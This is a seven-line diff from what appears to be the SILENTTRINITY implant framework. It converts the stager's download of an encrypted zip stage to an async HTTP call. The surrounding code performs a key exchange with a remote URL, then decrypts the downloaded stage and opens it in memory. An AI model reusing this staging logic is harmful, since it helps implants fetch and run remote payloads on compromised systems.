@@ -357,7 +357,7 @@ namespace SILENTTRINITY
                 if (Stage == null)
                 {
                     byte[] key = await Crypto.KeyExchangeAsync(URL);
-                    byte[] encrypted_zip = HttpGet(URL);
+                    byte[] encrypted_zip = await Http.GetAsync(URL);
                     Stage = ZipStorer.Open(new MemoryStream(Decrypt(key, encrypted_zip)), FileAccess.ReadWrite, true);
                 }
 
